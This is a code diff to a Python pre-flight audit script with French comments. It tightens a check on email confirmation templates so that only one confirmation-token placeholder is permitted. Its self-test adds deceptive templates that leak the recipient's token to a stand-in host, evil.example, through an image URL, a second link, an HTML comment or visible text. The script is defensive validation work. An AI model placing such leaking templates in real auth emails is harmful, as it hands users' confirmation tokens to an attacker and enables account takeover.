@@ -3,6 +3,7 @@
 import argparse
 import json
 import os
+import re
 from pathlib import Path
 from html.parser import HTMLParser
 from urllib.parse import parse_qsl, urlsplit
@@ -45,7 +46,17 @@ class ConfirmationLinkParser(HTMLParser):
 
 
 def has_secure_confirmation_link(content):
-    if not isinstance(content, str) or "{{ .ConfirmationURL }}" in content:
+    if not isinstance(content, str):
+        return False
+    # Un seul jeton dans le modèle, réservé au href de confirmation.
+    # Sinon un bon lien peut masquer une fuite vers une image, un deuxième
+    # lien, un commentaire ou un texte qui révèle le jeton du destinataire.
+    # Inclut les variantes Go Template avec espaces ou pipeline.
+    token_references = [
+        placeholder for placeholder in re.findall(r"\{\{[^{}]*\}\}", content)
+        if re.search(r"\.(?:TokenHash|Token|ConfirmationURL)\b", placeholder)
+    ]
+    if token_references != ["{{ .TokenHash }}"]:
         return False
     try:
         parser = ConfirmationLinkParser()
@@ -160,13 +171,33 @@ def selftest():
         "<a href='https://evil.example/' href='"+CONFIRM+"#token_hash={{ .TokenHash }}&amp;type=email'>Confirmer</a>",
         "<a href='"+CONFIRM+"#token_hash={{ .TokenHash }}&amp;type=email' href='https://evil.example/'>Confirmer</a>",
     ]
+    # Un bon lien ne compense pas la divulgation du même jeton ailleurs.
+    # Un logo/external footer sans jeton reste permis.
+    safe = good["mailer_templates_confirmation_content"]
+    leaked_templates = [
+        safe + "<img src='https://evil.example/collect?token={{ .TokenHash }}'>",
+        safe + "<a href='https://evil.example/?token={{ .TokenHash }}'>Aide</a>",
+        safe + "<!-- le jeton : {{ .TokenHash }} -->",
+        safe + "<p>Copie du jeton : {{ .TokenHash }}</p>",
+        safe + safe,
+        safe + "<img src='https://evil.example/collect?token={{.TokenHash}}'>",
+        safe + "<img src='https://evil.example/collect?token={{ .TokenHash | urlquery }}'>",
+        safe + "<a href='https://evil.example/?token={{ .Token }}'>Code</a>",
+        safe + "<a href='{{ .ConfirmationURL }}'>Autre lien</a>",
+        safe + "<img src='https://evil.example/collect?token={{ printf \"%s\" .TokenHash }}'>",
+        safe + "<p>{{- .TokenHash -}}</p>",
+    ]
+    deceptive_templates.extend(leaked_templates)
     for template in deceptive_templates:
         _, failed, _ = audit({**good, "mailer_templates_confirmation_content": template})
         assert "Modèle sécurisé par fragment" in failed, "Faux positif du modèle de courriel"
     assert has_secure_confirmation_link(
         "<a href='"+CONFIRM+"#token_hash={{ .TokenHash }}&type=email'>Confirmer</a>")
+    assert has_secure_confirmation_link(
+        good["mailer_templates_confirmation_content"] +
+        "<a href='https://www.benoitcantin.com/'>Accueil sans jeton</a>")
     print("OK prévol Auth : treize contrats, quinze régressions, "
-          "huit modèles trompeurs et wildcard testés.")
+          "dix-neuf modèles trompeurs (dont fuites de jeton) et wildcard testés.")
 
 
 def remote():
